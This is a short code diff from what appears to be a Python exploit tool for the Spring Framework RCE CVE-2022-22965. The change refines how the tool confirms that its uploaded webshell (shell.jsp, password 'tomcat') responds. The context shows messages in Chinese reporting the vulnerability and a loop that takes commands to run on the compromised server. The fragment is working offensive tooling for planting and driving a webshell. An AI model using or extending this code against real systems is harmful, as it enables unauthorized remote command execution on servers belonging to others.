@@ -63,7 +63,7 @@ def CVE_2022_22965(url, proxies, header_new):
         sleep(0.5)
         test = requests.get(url + "shell.jsp", timeout = outtime, allow_redirects=False, verify=False, proxies=proxies)
         test_again = requests.get(url + "shell.jsp", timeout = outtime, allow_redirects=False, verify=False, proxies=proxies)
-        if (test_again.status_code == 200):
+        if (test_again.status_code == 200) and ('title' not in test_again.text):
             cprint("[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + url + "shell.jsp?pwd=tomcat&cmd=whoami" ,"red")
             while 1:
                 Cmd = input("[+] 请输入要执行的命令>>> ")
@@ -798,3 +798,4 @@ def vul(url, proxies, header_new):
             break
     cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
     sys.exit()
+
